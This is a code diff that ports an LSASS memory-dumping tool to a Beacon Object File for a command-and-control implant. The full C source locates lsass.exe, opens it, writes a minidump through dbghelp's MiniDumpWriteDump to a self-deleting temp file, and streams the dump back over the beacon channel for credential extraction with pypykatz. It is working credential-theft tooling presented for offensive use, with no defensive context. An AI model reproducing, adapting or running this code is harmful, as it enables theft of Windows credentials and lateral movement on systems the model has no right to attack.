@@ -13,6 +13,24 @@
 #include <tlhelp32.h>
 #include "beacon_compat.h"
 
+/* BOF-style imports */
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
+DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
+DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTempPathA(DWORD, LPSTR);
+DECLSPEC_IMPORT UINT    WINAPI KERNEL32$GetTempFileNameA(LPCSTR, LPCSTR, UINT, LPSTR);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+
+DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
+
 /* dbghelp.dll — loaded at runtime */
 typedef BOOL (WINAPI *MiniDumpWriteDumpFn)(
     HANDLE hProcess, DWORD ProcessId, HANDLE hFile,
@@ -32,22 +50,22 @@ typedef struct {
  * For true in-memory: use NtReadVirtualMemory-based manual minidump. */
 
 static DWORD find_lsass_pid(void) {
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
 
     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(pe);
     DWORD pid = 0;
 
-    if (Process32FirstW(snap, &pe)) {
+    if (KERNEL32$Process32FirstW(snap, &pe)) {
         do {
-            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
+            if (MSVCRT$_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                 pid = pe.th32ProcessID;
                 break;
             }
-        } while (Process32NextW(snap, &pe));
+        } while (KERNEL32$Process32NextW(snap, &pe));
     }
-    CloseHandle(snap);
+    KERNEL32$CloseHandle(snap);
     return pid;
 }
 
@@ -65,28 +83,28 @@ void go(char *args, int args_len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS PID: %u\n", lsass_pid);
 
     /* Open LSASS */
-    HANDLE hProcess = OpenProcess(
+    HANDLE hProcess = KERNEL32$OpenProcess(
         PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
         FALSE, lsass_pid);
     if (!hProcess) {
         BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess failed: %u (need SeDebugPrivilege)\n",
-                     GetLastError());
+                     KERNEL32$GetLastError());
         return;
     }
 
     /* Load dbghelp.dll at runtime */
-    HMODULE hDbgHelp = LoadLibraryA("dbghelp.dll");
+    HMODULE hDbgHelp = KERNEL32$LoadLibraryA("dbghelp.dll");
     if (!hDbgHelp) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load dbghelp.dll\n");
-        CloseHandle(hProcess);
+        KERNEL32$CloseHandle(hProcess);
         return;
     }
 
     MiniDumpWriteDumpFn pMiniDumpWriteDump =
-        (MiniDumpWriteDumpFn)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
+        (MiniDumpWriteDumpFn)KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
     if (!pMiniDumpWriteDump) {
         BeaconPrintf(CALLBACK_ERROR, "[!] MiniDumpWriteDump not found\n");
-        CloseHandle(hProcess);
+        KERNEL32$CloseHandle(hProcess);
         return;
     }
 
@@ -96,14 +114,14 @@ void go(char *args, int args_len) {
      * The temp file approach is simpler; we delete it immediately after reading.
      */
     char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
-    GetTempPathA(MAX_PATH, tmpPath);
-    GetTempFileNameA(tmpPath, "dm", 0, tmpFile);
+    KERNEL32$GetTempPathA(MAX_PATH, tmpPath);
+    KERNEL32$GetTempFileNameA(tmpPath, "dm", 0, tmpFile);
 
-    HANDLE hFile = CreateFileA(tmpFile, GENERIC_ALL, 0, NULL,
+    HANDLE hFile = KERNEL32$CreateFileA(tmpFile, GENERIC_ALL, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFile for dump failed: %u\n", GetLastError());
-        CloseHandle(hProcess);
+        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFile for dump failed: %u\n", KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hProcess);
         return;
     }
 
@@ -111,29 +129,29 @@ void go(char *args, int args_len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Dumping LSASS memory...\n");
     BOOL ok = pMiniDumpWriteDump(hProcess, lsass_pid, hFile, 2, NULL, NULL, NULL);
     if (!ok) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] MiniDumpWriteDump failed: %u\n", GetLastError());
-        CloseHandle(hFile);
-        CloseHandle(hProcess);
+        BeaconPrintf(CALLBACK_ERROR, "[!] MiniDumpWriteDump failed: %u\n", KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hFile);
+        KERNEL32$CloseHandle(hProcess);
         return;
     }
 
     /* Read the dump back into memory */
-    DWORD fileSize = GetFileSize(hFile, NULL);
+    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Dump size: %u bytes\n", fileSize);
 
-    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+    KERNEL32$SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
     unsigned char *dumpData = (unsigned char *)malloc(fileSize);
     if (dumpData) {
         DWORD bytesRead;
-        ReadFile(hFile, dumpData, fileSize, &bytesRead, NULL);
+        KERNEL32$ReadFile(hFile, dumpData, fileSize, &bytesRead, NULL);
         /* Send the dump as output — chunking handled by agent */
         BeaconOutput(CALLBACK_OUTPUT, (char *)dumpData, bytesRead);
         free(dumpData);
     }
 
     /* File is deleted on close (FILE_FLAG_DELETE_ON_CLOSE) */
-    CloseHandle(hFile);
-    CloseHandle(hProcess);
+    KERNEL32$CloseHandle(hFile);
+    KERNEL32$CloseHandle(hProcess);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS dump complete. Parse with pypykatz.\n");
 }
